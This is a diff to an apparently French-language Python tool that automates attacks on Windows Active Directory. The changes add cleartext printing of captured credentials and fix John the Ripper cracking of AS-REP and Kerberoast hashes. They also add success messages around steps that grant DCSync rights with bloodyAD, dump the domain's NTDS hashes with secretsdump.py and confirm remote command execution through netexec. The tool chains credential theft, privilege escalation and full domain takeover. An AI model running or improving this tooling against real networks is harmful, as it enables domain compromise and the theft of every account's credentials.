@@ -75,6 +75,17 @@ def log(m):
         return
     _raw(m)
 
+def success(msg):
+    """Message de REUSSITE bien visible (vert/gras, ASCII anti-cp1252, jamais masque).
+    A appeler des qu'une etape ABOUTIT : enum users, cred obtenue, hash casse,
+    droits modifies, RCE, DCSync... -> l'utilisateur voit clairement ce qui a marche."""
+    _raw(f"{C.G}{C.BD}  [+++ REUSSI] {msg}{C.X}")
+    if DEBUGF:
+        try:
+            DEBUGF.write(f"[REUSSI] {_ANSI.sub('', str(msg))}\n"); DEBUGF.flush()
+        except Exception:
+            pass
+
 def dbg(m):
     """Bruit explicite : uniquement dans debug.log (jamais a l'ecran sauf --verbose)."""
     if DEBUGF:
@@ -208,6 +219,8 @@ def record_cred(state, user, password=None, nthash=None, src=""):
             return c
     cred = {"user": user, "password": password, "hash": nthash, "src": src}
     state.setdefault("creds", []).append(cred)
+    secret = password or (f":{nthash}" if nthash else "")
+    success(f"CRED obtenue : {user}:{secret}" + (f"  (source: {src})" if src else ""))
     BOARD.redraw()
     return cred
 
@@ -1075,6 +1088,7 @@ def phase1_unauth(hosts, args, state):
         save_table(args, "users_table.txt", ["#", "UTILISATEUR"], urows)
         for u in confirmed:
             board_user(state, u, "-", "")
+        success(f"ENUMERATION USERS : {len(confirmed)} compte(s) recupere(s)")
     elif roast_users:
         log(f"{C.GR}[i] {len(roast_users)} candidats (seed, non valides) -> AS-REP en aveugle.{C.X}")
 
@@ -2435,8 +2449,11 @@ def register_hashfile(state, htype, path):
     state.setdefault("hashes", {})[htype] = path
     label = {"asrep": "AS-REP (18200)", "kerberoast": "Kerberoast (13100)",
              "ntds": "NTDS (NTLM)"}.get(htype, htype)
-    for u in sorted(_hashfile_users(path)):
+    users_h = sorted(_hashfile_users(path))
+    for u in users_h:
         board_hash(state, u, label)
+    if htype in ("asrep", "kerberoast") and users_h:
+        success(f"HASH {label} capture : {len(users_h)} compte(s) -> a craquer")
 
 def _pot_paths():
     """Emplacements possibles du john.pot (existants uniquement)."""
@@ -2515,31 +2532,25 @@ def crack_hashes(args, state):
                     if u and pw:
                         creds[u] = pw
 
-        # (b) JOHN : on prefixe chaque hash par 'user:' -> John connait le login
-        #     -> 'john --show' renvoie 'user:password' (fini le '?:pw' non attribuable)
+        # (b) JOHN sur le fichier BRUT (comme la commande manuelle qui MARCHE).
+        #     FIX : l'ancienne version prefixait 'user:' dans un .john -> John ne
+        #     parsait plus le format krb5asrep -> 0 crack. On tourne sur `path` direct.
+        #     'john --show' sur un krb5asrep renvoie '$krb5asrep$..@REALM:password'.
         if have("john"):
-            jf = path + ".john"
             try:
-                with open(path, encoding="utf-8", errors="ignore") as s, \
-                     open(jf, "w", encoding="utf-8") as d:
-                    for line in s:
-                        line = line.strip()
-                        if line and "$krb5" in line:
-                            d.write(f"{_extract_cracked_user(line) or 'usr'}:{line}\n")
                 if not creds:
-                    log(f"{C.GR}[i] Crack {kind} via John (CPU)...{C.X}")
-                    run_cmd(["john", f"--format={fmt}", f"--wordlist={wl}", jf], args.crack_timeout)
-                rc, out, _ = run_cmd(["john", "--show", f"--format={fmt}", jf], 120)
+                    log(f"{C.GR}[i] Crack {kind} via John (CPU) sur {os.path.basename(path)}...{C.X}")
+                    run_cmd(["john", f"--format={fmt}", f"--wordlist={wl}", path], args.crack_timeout)
+                rc, out, _ = run_cmd(["john", "--show", f"--format={fmt}", path], 120)
                 for l in out.splitlines():
                     l = l.strip()
-                    if ":" not in l or re.search(r"password hash|cracked|Loaded|No password", l, re.I):
+                    if ":" not in l or re.search(r"password hash|cracked|Loaded|No password|Use the", l, re.I):
                         continue
-                    rest = l.split(":")
-                    u = rest[0].strip()
-                    # john --show = 'user:password[:uid:gid:...]' (ou hash intercale)
-                    # -> le mdp = 1er champ non vide et non-hash apres le user
-                    cand = [f.strip() for f in rest[1:] if f.strip() and not f.strip().startswith("$")]
-                    pw = cand[0] if cand else ""
+                    # cas krb5 : '$krb5...@REALM:pw' -> user via extract, pw = dernier champ
+                    if "$krb5" in l:
+                        u, pw = _extract_cracked_user(l), l.rsplit(":", 1)[-1].strip()
+                    else:  # cas 'user:pw'
+                        u, pw = l.split(":", 1)[0].strip(), l.rsplit(":", 1)[-1].strip()
                     if u and not u.startswith("$") and pw and "$krb5" not in pw:
                         creds[u] = pw
             except Exception:
@@ -2707,6 +2718,7 @@ def escalate_dcsync_writedacl(args, state, dc):
         rc, out, err = run_cmd(["bloodyAD"] + auth + ["add", "dcsync", user], 120)
         blob = (out + err).lower()
         if "dcsync" in blob and ("now able" in blob or "success" in blob or "granted" in blob or rc == 0):
+            success(f"DROITS MODIFIES : {user} ajoute a '{grp}' + DCSync octroye sur le domaine")
             add_finding(state, "CRIT",
                         f"AUTO-ESCALADE : {user} ajoute a '{grp}' + DCSync octroye sur le domaine",
                         f"secretsdump.py {args.domain}/{user}@{dc} -just-dc", dc)
@@ -2755,6 +2767,7 @@ def dcsync_dump(args, state, dc):
             pass
         rc, out, _ = run_cmd(["secretsdump.py", f"{tgt}@{dc}", "-just-dc", "-outputfile", outb] + extra, 600)
         if (os.path.isfile(ntds) and os.path.getsize(ntds) > 0) or "krbtgt:" in out.lower():
+            success("DCSYNC REUSSI : domaine dumpe (krbtgt + Administrator) -> DOMAIN ADMIN")
             add_finding(state, "CRIT", "DCSync reussi : hashes NTDS du domaine dumpes",
                         f"{ntds} (krbtgt -> Golden Ticket possible)", dc)
             state.setdefault("hashes", {})["ntds"] = ntds
@@ -2881,6 +2894,7 @@ def win_exec(args, state, host, proto="smb", cmd="whoami"):
         rc, out, _ = run_cmd([nxc, proto, host] + nxc_auth(args) +
                              (["-d", args.domain] if args.domain else []) + ["-x", cmd], 120)
         if out and re.search(r"[\w.-]+\\[\w$.-]+|nt authority", out, re.I):
+            success(f"RCE CONFIRME sur {host} ({proto}) -> shell disponible")
             add_finding(state, "CRIT", f"RCE confirme sur {host} ({proto} -x {cmd})", "shell dispo", host)
     idflag = f"-H {args.nthash}" if args.nthash else f"-p '{args.password}'"
     if proto == "winrm":
